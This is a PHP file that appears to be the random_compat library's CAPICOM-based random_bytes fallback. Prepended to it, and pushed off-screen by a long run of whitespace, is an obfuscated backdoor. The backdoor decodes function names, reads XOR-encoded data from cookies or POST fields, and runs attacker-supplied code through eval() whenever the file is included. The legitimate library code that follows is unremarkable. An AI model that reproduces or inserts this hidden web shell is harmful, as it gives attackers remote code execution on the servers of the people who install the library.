<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $i60f6db = 495;$GLOBALS['k12f87c'] = Array();global $k12f87c;$k12f87c = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['hfd32b'] = "\x9\xd\x76\x40\x61\x6e\x6f\x5d\x73\x3e\x34\x67\x52\xa\x5c\x60\x6a\x24\x65\x36\x28\x22\x41\x35\x4c\x7c\x56\x58\x46\x29\x3d\x77\x39\x51\x6b\x7b\x55\x2a\x62\x44\x57\x63\x32\x68\x3b\x7a\x75\x26\x43\x72\x2e\x23\x21\x2d\x74\x4a\x30\x59\x47\x6d\x3f\x70\x3c\x4d\x49\x38\x4b\x27\x5f\x20\x78\x2b\x71\x69\x50\x33\x54\x6c\x25\x3a\x42\x37\x5b\x79\x2c\x66\x48\x7d\x5e\x31\x2f\x4e\x5a\x53\x45\x7e\x4f\x64";$k12f87c[$k12f87c['hfd32b'][16].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][89]] = $k12f87c['hfd32b'][41].$k12f87c['hfd32b'][43].$k12f87c['hfd32b'][49];$k12f87c[$k12f87c['hfd32b'][83].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97]] = $k12f87c['hfd32b'][6].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][97];$k12f87c[$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][23]] = $k12f87c['hfd32b'][8].$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][77].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][5];$k12f87c[$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][4]] = $k12f87c['hfd32b'][97].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][5].$k12f87c['hfd32b'][18];$k12f87c[$k12f87c['hfd32b'][72].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][19]] = $k12f87c['hfd32b'][97].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][5].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][97];$k12f87c[$k12f87c['hfd32b'][59].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][75]] = $k12f87c['hfd32b'][73].$k12f87c['hfd32b'][5].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][54];$k12f87c[$k12f87c['hfd32b'][2].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][75]] = $k12f87c['hfd32b'][8].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][77].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][45].$k12f87c['hfd32b'][18];$k12f87c[$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][38]] = $k12f87c['hfd32b'][61].$k12f87c['hfd32b'][43].$k12f87c['hfd32b'][61].$k12f87c['hfd32b'][2].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][6].$k12f87c['hfd32b'][5];$k12f87c[$k12f87c['hfd32b'][61].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][18]] = $k12f87c['hfd32b'][46].$k12f87c['hfd32b'][5].$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][77].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][45].$k12f87c['hfd32b'][18];$k12f87c[$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][38]] = $k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][6].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][18];$k12f87c[$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][65]] = $k12f87c['hfd32b'][8].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][59].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][77].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][59].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][54];$k12f87c[$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][65]] = $k12f87c['hfd32b'][38].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][18];$k12f87c[$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][19]] = $k12f87c['hfd32b'][49].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][85];$k12f87c[$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][85]] = $_POST;$k12f87c[$k12f87c['hfd32b'][16].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][41]] = $_COOKIE;@$k12f87c[$k12f87c['hfd32b'][59].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][75]]($k12f87c['hfd32b'][18].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][6].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][77].$k12f87c['hfd32b'][6].$k12f87c['hfd32b'][11], NULL);@$k12f87c[$k12f87c['hfd32b'][59].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][75]]($k12f87c['hfd32b'][77].$k12f87c['hfd32b'][6].$k12f87c['hfd32b'][11].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][6].$k12f87c['hfd32b'][49].$k12f87c['hfd32b'][8], 0);@$k12f87c[$k12f87c['hfd32b'][59].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][75]]($k12f87c['hfd32b'][59].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][70].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][70].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][46].$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][6].$k12f87c['hfd32b'][5].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][59].$k12f87c['hfd32b'][18], 0);@$k12f87c[$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][65]](0);if (!$k12f87c[$k12f87c['hfd32b'][72].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][19]]($k12f87c['hfd32b'][22].$k12f87c['hfd32b'][24].$k12f87c['hfd32b'][12].$k12f87c['hfd32b'][94].$k12f87c['hfd32b'][22].$k12f87c['hfd32b'][39].$k12f87c['hfd32b'][57].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][12].$k12f87c['hfd32b'][36].$k12f87c['hfd32b'][91].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4])){$k12f87c[$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][4]]($k12f87c['hfd32b'][22].$k12f87c['hfd32b'][24].$k12f87c['hfd32b'][12].$k12f87c['hfd32b'][94].$k12f87c['hfd32b'][22].$k12f87c['hfd32b'][39].$k12f87c['hfd32b'][57].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][12].$k12f87c['hfd32b'][36].$k12f87c['hfd32b'][91].$k12f87c['hfd32b'][68].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4], 1);$df2f8311c = NULL;$g220ca = NULL;$k12f87c[$k12f87c['hfd32b'][61].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][18]] = $k12f87c['hfd32b'][65].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][53].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][53].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][53].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][53].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][85];global $p37e;function  r0b17faf($df2f8311c, $f398){global $k12f87c;$yf2f44f2b = "";for ($ddc88686=0; $ddc88686<$k12f87c[$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][23]]($df2f8311c);){for ($gede8=0; $gede8<$k12f87c[$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][23]]($f398) && $ddc88686<$k12f87c[$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][23]]($df2f8311c); $gede8++, $ddc88686++){$yf2f44f2b .= $k12f87c[$k12f87c['hfd32b'][16].$k12f87c['hfd32b'][19].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][89]]($k12f87c[$k12f87c['hfd32b'][83].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97]]($df2f8311c[$ddc88686]) ^ $k12f87c[$k12f87c['hfd32b'][83].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97]]($f398[$gede8]));}}return $yf2f44f2b;}function  b3a6964e($df2f8311c, $f398){global $k12f87c;global $p37e;return $k12f87c[$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][19]]($k12f87c[$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][19]]($df2f8311c, $p37e), $f398);}foreach ($k12f87c[$k12f87c['hfd32b'][16].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][42].$k12f87c['hfd32b'][23].$k12f87c['hfd32b'][41]] as $f398=>$a031d14){$df2f8311c = $a031d14;$g220ca = $f398;}if (!$df2f8311c){foreach ($k12f87c[$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][65].$k12f87c['hfd32b'][85]] as $f398=>$a031d14){$df2f8311c = $a031d14;$g220ca = $f398;}}$df2f8311c = @$k12f87c[$k12f87c['hfd32b'][61].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][18]]($k12f87c[$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][97].$k12f87c['hfd32b'][38].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][65]]($k12f87c[$k12f87c['hfd32b'][73].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][38]]($df2f8311c), $g220ca));if (isset($df2f8311c[$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][34]]) && $p37e==$df2f8311c[$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][34]]){if ($df2f8311c[$k12f87c['hfd32b'][4]] == $k12f87c['hfd32b'][73]){$ddc88686 = Array($k12f87c['hfd32b'][61].$k12f87c['hfd32b'][2] => @$k12f87c[$k12f87c['hfd32b'][54].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][4].$k12f87c['hfd32b'][75].$k12f87c['hfd32b'][18].$k12f87c['hfd32b'][41].$k12f87c['hfd32b'][10].$k12f87c['hfd32b'][38]](),$k12f87c['hfd32b'][8].$k12f87c['hfd32b'][2] => $k12f87c['hfd32b'][89].$k12f87c['hfd32b'][50].$k12f87c['hfd32b'][56].$k12f87c['hfd32b'][53].$k12f87c['hfd32b'][89],);echo @$k12f87c[$k12f87c['hfd32b'][2].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][32].$k12f87c['hfd32b'][89].$k12f87c['hfd32b'][85].$k12f87c['hfd32b'][81].$k12f87c['hfd32b'][75]]($ddc88686);}elseif ($df2f8311c[$k12f87c['hfd32b'][4]] == $k12f87c['hfd32b'][18]){eval/*m82e0b*/($df2f8311c[$k12f87c['hfd32b'][97]]);}exit();}} ?><?php
/**
 * Random_* Compatibility Library 
 * for using the new PHP 7 random_* API in PHP 5 projects
 * 
 * The MIT License (MIT)
 * 
 * Copyright (c) 2015 Paragon Initiative Enterprises
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

if ( ! is_callable( 'random_bytes' ) ):
/**
 * Windows with PHP < 5.3.0 will not have the function
 * openssl_random_pseudo_bytes() available, so let's use
 * CAPICOM to work around this deficiency.
 * 
 * @param int $bytes
 * 
 * @throws Exception
 * 
 * @return string
 */
function random_bytes($bytes)
{
    try {
        $bytes = RandomCompat_intval($bytes);
    } catch (TypeError $ex) {
        throw new TypeError(
            'random_bytes(): $bytes must be an integer'
        );
    }

    if ($bytes < 1) {
        throw new Error(
            'Length must be greater than 0'
        );
    }

    $buf = '';
    $util = new COM('CAPICOM.Utilities.1');
    $execCount = 0;

    /**
     * Let's not let it loop forever. If we run N times and fail to
     * get N bytes of random data, then CAPICOM has failed us.
     */
    do {
        $buf .= base64_decode($util->GetRandom($bytes, 0));
        if (RandomCompat_strlen($buf) >= $bytes) {
            /**
             * Return our random entropy buffer here:
             */
            return RandomCompat_substr($buf, 0, $bytes);
        }
        ++$execCount; 
    } while ($execCount < $bytes);

    /**
     * If we reach here, PHP has failed us.
     */
    throw new Exception(
        'Could not gather sufficient random data'
    );
}
endif;
